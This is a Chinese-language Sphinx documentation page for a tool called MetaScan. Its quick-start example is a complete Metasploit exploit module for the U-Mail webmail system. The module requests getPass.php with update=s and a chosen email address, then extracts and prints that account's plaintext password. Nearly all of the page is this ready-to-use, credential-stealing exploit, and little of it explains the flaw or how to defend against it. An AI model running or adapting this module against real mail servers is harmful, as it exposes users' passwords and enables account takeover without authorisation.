欢迎使用MetaScan开发文档
========================

快速入门
========

示例代码如下::

    #encoding:utf-8
    require 'msf/core'
    class Metasploit3 < Msf::Exploit::Remote
      Rank = ExcellentRanking
      include Msf::Exploit::Remote::HttpClient
    
      def initialize(info={})
        super(update_info(info,
            'Name'           => "U-Mail System Unauthorized Access Vulnerability",
            'Description'    => %q{
              U-Mail邮件系统权限设置问题导致任意用户密码可越权查看，当updata参数的值为s，只需将email参数的值指定为一个已存在的邮箱账号即可查看任意账户密码。
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
              [
              'Rain'    #Metasploit-CNNS
            ],
            'Platform'        => [ 'php' ],
            'Arch'           => ARCH_PHP,
            'Targets'        =>[[ 'U-Mail', { }]],
            'Privileged'     => false,
            'DisclosureDate' => "Apr 11 2011",
            'DefaultTarget'  => 0))
        register_options(
          [
            OptString.new('RHOST', [true, 'The DOMAIN', '']), 
            OptString.new('RPORT', [true, 'The port', '80']),
            OptString.new('TARGETURI', [true, 'The base path to U-Mail', '/webmail/']),
            OptString.new('EMAIL', [true, 'The email to U-Mail', '']),
          ], self.class)
      end
    
      def exploit
        begin
    	    res = send_request_cgi( {
    	        'method' => "GET",
    	        'uri'    => normalize_uri(datastore['TARGETURI']) + "/getPass.php?update=s&email=#{datastore['EMAIL']}"
    	      }, 20)
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
        rescue ::Timeout::Error, ::Errno::EPIPE
        end
          body_data = res.body.force_encoding('UTF-8')
          if body_data =~ /你的密码是/
            data = body_data.scan(/你的密码是\<\/p\>\<p\>\<center\>\<font color=red\>(.*?)\<\/font\>/)
            if data and data.first and data.first.first
              print_good("---------账号--------\n邮箱 = #{datastore['EMAIL']}, 密码 = #{data.first.first}", "good")
            else 
              print_error("漏洞利用失败！")
            end
          else
            print_error("漏洞利用失败！")
          end
      end
    end


.. toctree::
   :maxdepth: 2

   introduce


Indices and tables
==================

* :ref:`genindex`
* :ref:`modindex`
* :ref:`search`

